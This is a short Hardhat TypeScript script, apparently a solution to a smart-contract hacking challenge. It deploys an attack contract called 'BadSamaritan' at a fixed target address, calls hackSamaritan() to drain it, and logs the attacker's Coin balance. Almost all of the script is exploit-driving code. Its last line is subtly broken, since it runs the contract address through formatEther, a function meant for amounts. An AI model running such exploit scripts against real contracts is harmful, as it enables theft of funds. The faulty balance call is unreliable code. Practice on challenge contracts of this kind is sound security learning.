// @ts-ignore
import { web3, ethers } from "hardhat";
import {address} from "hardhat/internal/core/config/config-validation";

async function main() {

    const attack = await ethers.getContractFactory('BadSamaritan')
    const badSam = await attack.deploy('0x22a34c750D795D2141056Ab78406AC3393cBc043')
    await badSam.deployed()

    const tx = await badSam.hackSamaritan()
    await tx.wait()

    const Coin = await ethers.getContractFactory('Coin')
    const coin = await Coin.attach('0xb3F1E10cd7dBb072ECDaEaD3d49e9C4466B0e3F5')

    console.log("Balance of Coin:-", await coin.balances(ethers.utils.formatEther(badSam.address)))
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
